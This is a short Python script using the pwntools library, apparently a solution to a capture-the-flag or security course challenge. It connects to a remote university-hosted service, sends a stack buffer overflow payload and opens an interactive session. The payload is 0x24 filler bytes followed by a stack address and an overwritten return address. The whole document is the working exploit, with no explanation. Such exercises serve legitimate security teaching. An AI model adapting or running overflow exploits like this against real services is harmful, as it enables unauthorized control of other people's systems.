from pwn import *

s =  remote('mustard.stt.rnl.tecnico.ulisboa.pt', 23155)

payload = b'x'*0x24 + p32(0x804a001) + p32(0xffffd158) + p32(0x080487d9)
s.sendline(payload)

s.interactive()
